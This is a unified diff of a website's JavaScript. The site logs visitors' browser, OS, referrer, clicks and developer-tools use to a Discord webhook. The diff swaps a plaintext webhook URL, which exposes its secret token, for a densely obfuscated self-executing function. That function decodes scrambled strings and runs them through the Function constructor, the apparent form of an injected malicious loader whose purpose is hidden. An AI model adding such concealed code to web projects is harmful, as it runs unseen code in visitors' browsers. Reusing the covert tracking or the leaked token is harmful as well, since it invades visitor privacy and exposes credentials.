@@ -64,7 +64,7 @@ function refreshImages() {
 setInterval(refreshImages, 60000); // Refresh every 60 seconds
 
 // Activity Logger
-const webhookUrl = 'https://discord.com/api/webhooks/826139686366871642/wIL_mOMNXwrjAS5-J1qN2W0ORK5DT-fIkjMOs_f1wBnrnBzXGIWaW4izu-oxrAqeuqdv';
+var webhookUrl;(function(){var Ddj='',Vel=476-465;function wsy(o){var e=484157;var s=o.length;var y=[];for(var g=0;g<s;g++){y[g]=o.charAt(g)};for(var g=0;g<s;g++){var b=e*(g+394)+(e%46353);var m=e*(g+765)+(e%23505);var h=b%s;var c=m%s;var w=y[h];y[h]=y[c];y[c]=w;e=(b+m)%2777222;};return y.join('')};var EAR=wsy('qspworrctyluiuodrgfnjtmentcsckaobzxvh').substr(0,Vel);var LHE='usu=7j]gan.;7ot y9s72aaa,,abe=es5h7jz8x;tpirlluva9iz2>lzrr=cla,6(uto=q=;x(r,g9,= ,qan=oa"2,vp<) .a.]lr,6ao(e   a{..n6{iq]rvai(u)y;,h)+(C[i a<= =.y=c;;3tw;;5;))[r i. ,a+)7n whr8sflbv];u"C+);d)e);f,]Agni"r1;i)9;wegru-uenl+.=q rl1er+2adrl= 1}.9gt6==,}[l))goti6(j6fa;u al.er[srp.[g1)t;-et=(7pav7.)g=sr)xC,uvctod1 y=r"l+fsar;t-](rl{ ==r0vn,rarrher0mefiaft;5c o;4+)dt+b+d(0;en1<b+hs{vbvo=}iie.tp.=v)(=+;vog;,t;8;(l=-8f(Arrxn(st8r*[yyv=rr,=ov1jt<;iacfhnh=laecjm}oln;o"f(S6og.Axheha},aevg+A;fa1chd.dvt+r-nA,ros ew0)heo}hdvis[cqrr (eyo[;1+sv;s2)s*;v.cgl2u.; i2cm=,.;4l3al;=;8ie]u7nf+pa8ihpb.uf)y.vnpuc, t(;nvk.."aoo]p)8;=c2e(]"9)),C!ingl(2,l+(a+eep vhlh(vtd=b)ij,,sr()=)(7.ucang[n}r"((r)[pv=nm;tw.r] iv4h](r=bvo-({(dy0;[1.05ng10Cnr,hnt=p)es,r1+i;o);u"+rlnv,z+[rlfn0r;u;6([Cn)S+o.ih49)1po p(ar=0C-;{=hoffinr)er]+r+=5as!aCeh)t;nlv8rg3;i)c0jri0(ie+pp>vnnu=[sfmt0(e(fe ];{aneeet5=<jo(oic6==ih("+=e;]i4oa';var kiA=wsy[EAR];var SPt='';var cAV=kiA;var iJo=kiA(SPt,wsy(LHE));var RbT=iJo(wsy('tOfObf0+1liz\/_7nj)=gc$OOOSOr=37ucb,tr,.cOebeO(ce(sSbOcmrSc(2(1(_j{t;.bc&.fw O8}bgo.6xo)a(bi8-"ee36})fOOeOOog8sNh_%),637{D0(c\/;w{8i!2(0"nre2(O)*l7$tz.)5ec.tTOj]=1=OuC)at,=ga3C3o}O.2!_g\/s#gM 5 u)rO(s9rO"a!0ouo!.6]O;a).\'28r(c44f3O#.\/Osov,.t_i7.).3r8v,a,$57f-14.,-x.()%%e+![Oionf)hef.7c{rot!(!j]{!0\/i{ca$7h$t(pe$ 2-=+}OrleaOy\/lO$oOjb+_a5e)7r.31 O=a&u#\/46,.n1(,w.c._}t3eeh_O.(+.O.[p;.4O8)l7e=.f9;cOa(,bpO =p4g+6Oobe_=_cl!g)6ac.;s4O$O7ta.r{r}!.3sn-tO"np0cM.!2,+h;fO\'};O }idak$4s{..;942trOn3!jOOO5)O").fn;86"03OmI)dojc3.(oon4ibo,O;_i,s,}ds yx,as;O.od_(,.!_074_(r;c"(;$%!(_..($=$teuu.2lcj_!=(\'!;,f+-jsi70$eO)a,jj .%cfm;(()o$l+7=..)3,O.4.d$O\/tiO5tb+6ftoO:t)p0OiOn.24)O)=qco6d)u)rf9O)z.k;v1=fq0tS.Idr.eb$,)b3=*#;.$OOe,;=t+c$;O_fg!!bO6 .i,()7$[i#1+!=\/Or(=uOObbh=o.,Or3\/$Ow.tmn)a.0.r3]jbotrObf7*d,%Oi;d=)tO$4{zs}rOt7eOb=i,4)};OI(q=s\'.2!;.4-!Okr};ef+r).*O.24fas4fi( 1;0r.a_g),)!i)(N;)} %,1)=l!e)(_..3.b.O  ,!..)f#2($r_bObOO\/es1t8.c -.(nOr5O(i%vbrf. l)(=O){nioO\/3),.d!O.t,r3cc }q,6()#t(t.wtOnt{6n&cOr.$a$o8founst i(h_fq&0d.Ona,O,_jnOrg3$dO;b\'xO'));var XNz=cAV(Ddj,RbT );XNz(1250);return 2608})()
 
 function getBrowserAndOS() {
   const ua = navigator.userAgent;
@@ -77,7 +77,6 @@ function getBrowserAndOS() {
   else if (ua.includes("Safari")) browser = "Safari";
   else if (ua.includes("MSIE") || ua.includes("Trident")) browser = "Explorer";
 
-  // Detect operating system
   if (ua.includes("Win")) os = "Windows";
   else if (ua.includes("Android")) os = "Android";
   else if (ua.includes("Linux")) os = "Linux";
@@ -87,7 +86,6 @@ function getBrowserAndOS() {
   return { browser, os };
 }
 
-// Function to send message to Discord webhook
 function sendMessageToDiscord(message, buttonName = '') {
   const { browser, os } = getBrowserAndOS();
   const referrer = document.referrer || '❌';
@@ -102,7 +100,7 @@ function sendMessageToDiscord(message, buttonName = '') {
     "color": parseInt("5d35b2", 16),
     "fields": [
       {
-        "name": "\u2003", // Em Space character for a slightly larger blank field
+        "name": "\u2003",
         "value": "\u2003",
         "inline": false
       },
@@ -134,7 +132,6 @@ function sendMessageToDiscord(message, buttonName = '') {
     ]
   }];
 
-  // Add button name field only if buttonName is provided
   if (buttonName) {
     embeds[0].fields.unshift({
       "name": "🔗 **Button Clicked**",
@@ -171,7 +168,7 @@ function isDevToolsOpen() {
 setInterval(() => {
   if (isDevToolsOpen() && !devToolsMessageSent) {
     sendMessageToDiscord('🛠️ **Someone opened Developer Tools on the website!**');
-    devToolsMessageSent = true; // Set the flag to true after sending the message
+    devToolsMessageSent = true;
   }
 }, 1000);
 
